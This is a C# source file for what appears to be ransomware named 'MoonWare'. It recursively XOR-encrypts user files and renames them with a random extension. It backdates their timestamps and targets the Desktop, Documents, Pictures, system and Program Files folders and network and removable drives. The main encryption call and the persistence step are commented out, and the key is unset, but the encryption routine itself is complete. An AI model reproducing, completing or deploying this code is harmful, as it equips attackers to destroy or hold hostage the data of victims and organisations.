using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace MoonWare
{
    static class Program
    {
        static byte[] xor(byte[] bytes,byte[] pass)
        {
            if (bytes == null || pass == null)
                return null;
            for(int i = 0; i < bytes.Length; i++)
            {
                bytes[i] ^= pass[i % pass.Length];
            }
            return bytes;
        }
        static string encodeStr(string str)
        {
            if (str == null)
                return null;
            return Uri.EscapeDataString(str);
        }
        static void parseAndEncrypt(string beginnging)
        {
            string[] files = Directory.GetFiles(beginnging);
            foreach(string currentfiles in files)
            {
                FileInfo currentFileInfo = new FileInfo(currentfiles);
                if(filesToEncrpyt.Contains(currentFileInfo.Extension))
                {
                    try
                    {
                        byte[] newBytes = xor(File.ReadAllBytes(currentfiles), passBytes);
                        File.WriteAllBytes(currentfiles, newBytes);
                        File.Move(currentfiles, currentfiles.Replace(Path.GetFileName(currentfiles), "") + encodeStr(Path.GetFileNameWithoutExtension(currentfiles)) + extention);
                        currentFileInfo.LastWriteTime = DateTime.Now.AddDays(random.Next(-60, -10));
                        currentFileInfo.LastAccessTime = DateTime.Now.AddDays(random.Next(-30, -3));
                    }
                    catch { }
                }
            }
            string[] subDirs = Directory.GetDirectories(beginnging);
            foreach(string currentPath in subDirs)
            {
                parseAndEncrypt(currentPath);
            }
        }
        static Random random = new Random();
        static string filesToEncrpyt = ".txt.html.db.exe";
        static byte[] passBytes = null;
        static string extention = "." + random.Next().ToString("x");
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string myPath = Application.ExecutablePath;
            if(!myPath.StartsWith(startupPath))
            {
              //File.Move(myPath, Path.Combine(startupPath, Path.GetFileName(myPath)));
                List<string> pathsToEncrypt = new List<string>();
                pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
                pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
                pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyComputer));
                pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
                pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
                pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));
                pathsToEncrypt.Add(Path.GetTempPath());
                DriveInfo[] drives = DriveInfo.GetDrives();
                foreach (DriveInfo driveInfo in drives)
                {
                    if (driveInfo.DriveType == DriveType.Network || driveInfo.DriveType == DriveType.Removable)
                        pathsToEncrypt.Add(driveInfo.RootDirectory.FullName);
                }
                foreach (string currentPath in pathsToEncrypt)
                {
                    // parseAndEncrypt(currentPath);
                }
            }

            Application.Run(new Form1());
        }
    }
}
